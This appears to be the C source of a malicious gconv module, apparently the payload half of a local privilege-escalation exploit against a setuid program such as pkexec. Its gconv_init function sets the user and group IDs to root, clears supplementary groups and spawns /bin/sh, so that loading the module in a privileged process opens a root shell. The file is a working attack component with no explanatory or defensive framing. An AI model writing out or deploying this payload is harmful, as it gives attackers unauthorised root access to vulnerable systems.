#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <grp.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0, 0);
    execve("/bin/sh", NULL, NULL);
}
